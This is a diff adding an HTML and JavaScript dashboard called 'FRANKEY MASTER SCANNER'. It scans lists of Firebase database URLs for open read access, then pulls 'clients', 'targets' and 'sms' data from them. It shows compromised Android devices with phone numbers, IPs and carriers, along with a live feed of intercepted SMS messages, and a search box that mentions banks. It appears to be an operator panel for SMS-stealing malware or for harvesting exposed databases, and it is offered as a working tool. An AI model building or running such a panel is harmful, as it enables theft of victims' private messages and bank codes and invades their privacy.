@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FRANKEY MASTER SCANNER</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0a0a; color: #e0e0e0; min-height: 100vh; }
+.header { background: linear-gradient(135deg, #1a0a0a 0%, #0d0d0d 100%); border-bottom: 2px solid #ef4444; padding: 14px 20px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+.header h1 { font-size: 20px; font-weight: 800; color: #fff; letter-spacing: -0.5px; }
+.header h1 span { color: #ef4444; }
+.header .badge { background: #ef4444; color: #fff; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: 700; animation: pulse 2s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+.stats { display: flex; gap: 10px; padding: 12px 20px; overflow-x: auto; }
+.stat-card { background: #111; border: 1px solid #1f1f1f; border-radius: 10px; padding: 10px 16px; min-width: 120px; text-align: center; }
+.stat-card .val { font-size: 22px; font-weight: 800; color: #fff; }
+.stat-card .label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 2px; }
+.stat-card.green .val { color: #4ade80; }
+.stat-card.red .val { color: #ef4444; }
+.stat-card.blue .val { color: #60a5fa; }
+.stat-card.yellow .val { color: #facc15; }
+.main { padding: 12px 20px; }
+.section-title { font-size: 13px; font-weight: 700; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
+.firebase-list { display: flex; flex-direction: column; gap: 6px; margin-bottom: 20px; max-height: 300px; overflow-y: auto; }
+.firebase-item { background: #111; border: 1px solid #1f1f1f; border-radius: 8px; padding: 10px 14px; display: flex; align-items: center; justify-content: space-between; gap: 10px; cursor: pointer; transition: all 0.2s; }
+.firebase-item:hover { border-color: #ef4444; background: #1a1111; }
+.firebase-item .url { font-family: monospace; font-size: 11px; color: #aaa; flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.firebase-item .status { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.firebase-item .status.active { background: #4ade80; box-shadow: 0 0 6px #4ade80; }
+.firebase-item .status.locked { background: #ef4444; box-shadow: 0 0 6px #ef4444; }
+.firebase-item .status.error { background: #facc15; }
+.data-panel { background: #111; border: 1px solid #1f1f1f; border-radius: 10px; padding: 14px; margin-bottom: 16px; }
+.data-panel .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+.data-panel .panel-header h3 { font-size: 14px; font-weight: 700; color: #fff; }
+.data-panel .panel-header .count { font-size: 11px; color: #666; }
+.device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px; }
+.device-card { background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 10px; padding: 12px; transition: all 0.2s; }
+.device-card:hover { border-color: #333; transform: translateY(-1px); }
+.device-card .dev-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
+.device-card .dev-icon { width: 36px; height: 36px; border-radius: 8px; background: #1a1a1a; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+.device-card .dev-name { font-size: 13px; font-weight: 700; color: #fff; }
+.device-card .dev-id { font-size: 10px; color: #555; font-family: monospace; }
+.device-card .dev-status { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 700; }
+.device-card .dev-status.online { background: #4ade8020; color: #4ade80; }
+.device-card .dev-status.offline { background: #ef444420; color: #ef4444; }
+.device-card .dev-detail { font-size: 11px; color: #888; margin-top: 4px; }
+.device-card .dev-detail span { color: #ccc; }
+.sms-list { display: flex; flex-direction: column; gap: 6px; max-height: 400px; overflow-y: auto; }
+.sms-item { background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 8px; padding: 10px 12px; }
+.sms-item .sms-from { font-size: 12px; font-weight: 700; color: #60a5fa; }
+.sms-item .sms-text { font-size: 12px; color: #ccc; margin-top: 4px; line-height: 1.4; }
+.sms-item .sms-time { font-size: 10px; color: #555; margin-top: 4px; }
+.tabs { display: flex; gap: 4px; margin-bottom: 12px; flex-wrap: wrap; }
+.tab { padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; background: #111; border: 1px solid #1f1f1f; color: #888; transition: all 0.2s; }
+.tab:hover { border-color: #333; color: #ccc; }
+.tab.active { background: #ef4444; border-color: #ef4444; color: #fff; }
+.btn { padding: 8px 16px; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; border: none; transition: all 0.2s; }
+.btn-primary { background: #ef4444; color: #fff; }
+.btn-primary:hover { background: #dc2626; }
+.btn-secondary { background: #1a1a1a; color: #ccc; border: 1px solid #2a2a2a; }
+.btn-secondary:hover { background: #222; color: #fff; }
+.btn-sm { padding: 5px 10px; font-size: 11px; }
+.input { background: #111; border: 1px solid #1f1f1f; border-radius: 8px; padding: 8px 12px; color: #fff; font-size: 12px; font-family: monospace; outline: none; width: 100%; }
+.input:focus { border-color: #ef4444; }
+.input-row { display: flex; gap: 8px; align-items: center; }
+.input-row .input { flex: 1; }
+.toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #1a1a1a; border: 1px solid #ef4444; color: #fff; padding: 10px 20px; border-radius: 10px; font-size: 12px; font-weight: 600; z-index: 9999; display: none; }
+.toast.show { display: block; animation: fadeIn 0.3s; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.loading { display: flex; align-items: center; justify-content: center; padding: 40px; color: #555; font-size: 13px; }
+.loading .spinner { width: 20px; height: 20px; border: 2px solid #333; border-top-color: #ef4444; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.empty-state { text-align: center; padding: 30px; color: #444; font-size: 13px; }
+.empty-state .icon { font-size: 32px; margin-bottom: 8px; }
+.refresh-info { font-size: 10px; color: #444; text-align: right; margin-top: 8px; }
+.filter-row { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; align-items: center; }
+.filter-row .input { max-width: 250px; }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>FRANKEY <span>MASTER SCANNER</span></h1>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <span class="badge" id="statusBadge">● LIVE</span>
+    <span style="font-size:11px;color:#666;" id="lastRefresh">Last refresh: --</span>
+  </div>
+</div>
+
+<div class="stats" id="statsBar">
+  <div class="stat-card green"><div class="val" id="statActive">0</div><div class="label">Active</div></div>
+  <div class="stat-card red"><div class="val" id="statLocked">0</div><div class="label">Locked</div></div>
+  <div class="stat-card blue"><div class="val" id="statDevices">0</div><div class="label">Devices</div></div>
+  <div class="stat-card yellow"><div class="val" id="statSMS">0</div><div class="label">SMS</div></div>
+</div>
+
+<div class="main">
+  <div class="section-title">🔥 Firebase URLs (143 total)</div>
+  <div class="firebase-list" id="firebaseList">
+    <div class="loading"><div class="spinner"></div>Scanning Firebase URLs...</div>
+  </div>
+
+  <div class="filter-row">
+    <input type="text" class="input" id="searchInput" placeholder="Search devices, numbers, banks..." oninput="filterDevices()">
+    <select class="input" id="statusFilter" onchange="filterDevices()" style="max-width:130px;">
+      <option value="all">All Status</option>
+      <option value="online">Online</option>
+      <option value="offline">Offline</option>
+    </select>
+    <button class="btn btn-secondary btn-sm" onclick="refreshAll()">↻ Refresh</button>
+  </div>
+
+  <div class="section-title">📱 Devices</div>
+  <div class="device-grid" id="deviceGrid">
+    <div class="empty-state"><div class="icon">📡</div>No devices connected yet.<br>Connect Firebase URLs above to start scanning.</div>
+  </div>
+
+  <div class="section-title" style="margin-top:20px;">💬 Live SMS</div>
+  <div class="data-panel">
+    <div class="panel-header"><h3>SMS Messages</h3><span class="count" id="smsCount">0 messages</span></div>
+    <div class="sms-list" id="smsList">
+      <div class="empty-state">No SMS data yet. Connect a Firebase with public read rules to see messages.</div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const CONFIG = {
+  backendUrl: window.location.origin,
+  refreshInterval: 15000,
+  firebaseUrls: [],
+  firebasePaths: ['clients', 'targets', 'users', 'devices', 'sms', 'messages', 'data', 'panel', 'admin', 'info']
+};
+
+let allDevices = [];
+let allSMS = [];
+let scanResults = [];
+
+async function init() {
+  showToast('FRANKEY Scanner initializing...');
+  await scanFirebaseUrls();
+  startAutoRefresh();
+}
+
+async function scanFirebaseUrls() {
+  const urls = CONFIG.firebaseUrls;
+  const listEl = document.getElementById('firebaseList');
+  scanResults = [];
+  listEl.innerHTML = '<div class="loading"><div class="spinner"></div>Scanning ' + urls.length + ' Firebase URLs...</div>';
+
+  for (const url of urls) {
+    const result = await scanFirebaseUrl(url);
+    scanResults.push(result);
+    renderFirebaseList();
+  }
+
+  await fetchAllDeviceData();
+  await fetchSMS();
+  updateStats();
+}
+
+function scanFirebaseUrl(url) {
+  return new Promise(async (resolve) => {
+    try {
+      const cleanUrl = url.replace(/\/$/, '');
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      const res = await fetch(cleanUrl + '/.json?shallow=true', { signal: controller.signal });
+      clearTimeout(timeout);
+      if (res.ok) {
+        resolve({ url: cleanUrl, status: 'active', error: null });
+      } else if (res.status === 401 || res.status === 403) {
+        resolve({ url: cleanUrl, status: 'locked', error: 'Permission denied' });
+      } else {
+        resolve({ url: cleanUrl, status: 'error', error: 'HTTP ' + res.status });
+      }
+    } catch (e) {
+      resolve({ url: url, status: 'error', error: e.message });
+    }
+  });
+}
+
+function renderFirebaseList() {
+  const listEl = document.getElementById('firebaseList');
+  if (scanResults.length === 0) {
+    listEl.innerHTML = '<div class="loading"><div class="spinner"></div>Scanning...</div>';
+    return;
+  }
+  listEl.innerHTML = scanResults.map(r =>
+    '<div class="firebase-item" onclick="viewFirebaseData(\'' + r.url.replace(/'/g, "\\'") + '\')">' +
+    '<span class="status ' + r.status + '"></span>' +
+    '<span class="url">' + r.url + '</span>' +
+    '<span style="font-size:10px;color:' + (r.status === 'active' ? '#4ade80' : r.status === 'locked' ? '#ef4444' : '#facc15') + ';font-weight:700;">' + r.status.toUpperCase() + '</span>' +
+    '</div>'
+  ).join('');
+}
+
+async function viewFirebaseData(url) {
+  showToast('Fetching data from ' + url + '...');
+  try {
+    const res = await fetch(CONFIG.backendUrl + '/api/firebase/fetch?url=' + encodeURIComponent(url) + '&path=clients');
+    const data = await res.json();
+    if (data.success && data.data) {
+      for (const [key, val] of Object.entries(data.data)) {
+        const existing = allDevices.find(d => d.id === key);
+        if (!existing) {
+          allDevices.push({ id: key, ...val, firebaseUrl: url });
+        } else {
+          existing.lastSeen = val.lastSeen || val.last_seen || val.updatedAt || val.timestamp;
+        }
+      }
+      renderDevices();
+      showToast('Loaded ' + allDevices.length + ' devices');
+    } else {
+      showToast('No data found or permission denied for ' + url);
+    }
+  } catch (e) {
+    showToast('Error: ' + e.message);
+  }
+}
+
+async function fetchAllDeviceData() {
+  const urls = CONFIG.firebaseUrls;
+  for (const url of urls) {
+    try {
+      const res = await fetch(CONFIG.backendUrl + '/api/firebase/fetch?url=' + encodeURIComponent(url) + '&path=clients');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success && data.data) {
+          for (const [key, val] of Object.entries(data.data)) {
+            const existing = allDevices.find(d => d.id === key);
+            if (!existing) {
+              allDevices.push({ id: key, ...val, firebaseUrl: url });
+            }
+          }
+        }
+      }
+    } catch (e) { /* skip */ }
+  }
+  renderDevices();
+}
+
+function renderDevices() {
+  const grid = document.getElementById('deviceGrid');
+  const search = document.getElementById('searchInput').value.toLowerCase();
+  const statusFilter = document.getElementById('statusFilter').value;
+
+  let filtered = allDevices;
+  if (search) {
+    filtered = filtered.filter(d =>
+      (d.name || d.deviceName || d.model || '').toLowerCase().includes(search) ||
+      (d.phoneNumber || '').includes(search) ||
+      (d.id || '').toLowerCase().includes(search) ||
+      (d.battery || '').toString().includes(search)
+    );
+  }
+  if (statusFilter === 'online') {
+    filtered = filtered.filter(d => d.status === true || d.status === 'online');
+  } else if (statusFilter === 'offline') {
+    filtered = filtered.filter(d => d.status === false || d.status === 'offline');
+  }
+
+  if (filtered.length === 0) {
+    grid.innerHTML = '<div class="empty-state"><div class="icon">📡</div>No devices match your filter.</div>';
+  } else {
+    grid.innerHTML = filtered.map(d => {
+      const isOnline = d.status === true || d.status === 'online';
+      const battery = d.battery ?? d.batteryPercent ?? '—';
+      const model = d.modelName || d.model || d.deviceName || d.name || 'Unknown Device';
+      const phone = d.phoneNumber || d.mobNo || d.mobile || '—';
+      const android = d.androidVersion || d.androidV || d.osVersion || '—';
+      const lastSeen = d.lastSeen || d.last_seen || d.lastOnline || d.last_active || d.timestamp || d.time || '—';
+      const provider = d.service_provider || d.provider || d.carrier || '—';
+      const ip = d.ip_address || d.ip || '—';
+      const storage = d.storage || d.totalStorage || '—';
+      const sdk = d.sdkV || d.sdkVersion || d.buildNumber || '—';
+      return '<div class="device-card">' +
+        '<div class="dev-header">' +
+        '<div class="dev-icon">📱</div>' +
+        '<div>' +
+        '<div class="dev-name">' + model + '</div>' +
+        '<div class="dev-id">' + (d.id ? d.id.substring(0, 12) + '...' : '') + '</div>' +
+        '</div>' +
+        '<span class="dev-status ' + (isOnline ? 'online' : 'offline') + '">' + (isOnline ? 'ONLINE' : 'OFFLINE') + '</span>' +
+        '</div>' +
+        '<div class="dev-detail"><span>📞</span> ' + phone + '</div>' +
+        '<div class="dev-detail"><span>🤖</span> Android ' + android + '</div>' +
+        '<div class="dev-detail"><span>🔋</span> Battery: ' + battery + '</div>' +
+        '<div class="dev-detail"><span>📡</span> ' + provider + ' | ' + ip + '</div>' +
+        '<div class="dev-detail"><span>💾</span> Storage: ' + storage + ' | SDK: ' + sdk + '</div>' +
+        '<div class="dev-detail"><span>🕐</span> ' + lastSeen + '</div>' +
+        '</div>';
+    }).join('');
+  }
+}
+
+function filterDevices() { renderDevices(); }
+
+async function fetchSMS() {
+  const urls = CONFIG.firebaseUrls;
+  allSMS = [];
+  for (const url of urls) {
+    try {
+      const paths = ['sms', 'messages', 'data', 'panel', 'admin', 'info', 'targets', 'users'];
+      for (const path of paths) {
+        const res = await fetch(CONFIG.backendUrl + '/api/firebase/fetch?url=' + encodeURIComponent(url) + '&path=' + path);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.success && data.data) {
+            for (const [key, val] of Object.entries(data.data)) {
+              if (typeof val === 'object' && (val.text || val.body || val.message)) {
+                allSMS.push({
+                  id: key,
+                  text: val.text || val.body || val.message || '',
+                  from: val.sender || val.from || val.phone || val.number || 'Unknown',
+                  time: val.dateTime || val.date || val.timestamp || val.time || '',
+                  firebaseUrl: url
+                });
+              } else if (typeof val === 'string' && val.length > 10) {
+                allSMS.push({ id: key, text: val, from: 'Unknown', time: '', firebaseUrl: url });
+              }
+            }
+          }
+        }
+      }
+    } catch (e) { /* skip */ }
+  }
+
+  const smsList = document.getElementById('smsList');
+  const recentSMS = allSMS.slice(0, 50);
+  document.getElementById('smsCount').textContent = allSMS.length + ' messages';
+
+  if (recentSMS.length === 0) {
+    smsList.innerHTML = '<div class="empty-state">No SMS messages found. Ensure your Firebase has public read rules.</div>';
+  } else {
+    smsList.innerHTML = recentSMS.map(s =>
+      '<div class="sms-item">' +
+      '<div class="sms-from">' + s.from + '</div>' +
+      '<div class="sms-text">' + (s.text || '').substring(0, 300) + '</div>' +
+      '<div class="sms-time">' + s.time + (s.firebaseUrl ? ' · ' + s.firebaseUrl.substring(0, 40) : '') + '</div>' +
+      '</div>'
+    ).join('');
+  }
+}
+
+function updateStats() {
+  document.getElementById('statActive').textContent = scanResults.filter(r => r.status === 'active').length;
+  document.getElementById('statLocked').textContent = scanResults.filter(r => r.status === 'locked').length;
+  document.getElementById('statDevices').textContent = allDevices.length;
+  document.getElementById('statSMS').textContent = allSMS.length;
+}
+
+async function refreshAll() {
+  document.getElementById('lastRefresh').textContent = 'Refreshing...';
+  allDevices = [];
+  allSMS = [];
+  await scanFirebaseUrls();
+  updateStats();
+  document.getElementById('lastRefresh').textContent = 'Last refresh: ' + new Date().toLocaleTimeString();
+  showToast('Data refreshed successfully!');
+}
+
+function startAutoRefresh() {
+  setInterval(async () => {
+    await fetchAllDeviceData();
+    await fetchSMS();
+    updateStats();
+    document.getElementById('lastRefresh').textContent = 'Auto-refresh: ' + new Date().toLocaleTimeString();
+  }, CONFIG.refreshInterval);
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+document.addEventListener('DOMContentLoaded', init);
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"9f0cb6c09a0044d6981ba2b8776adb52","spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
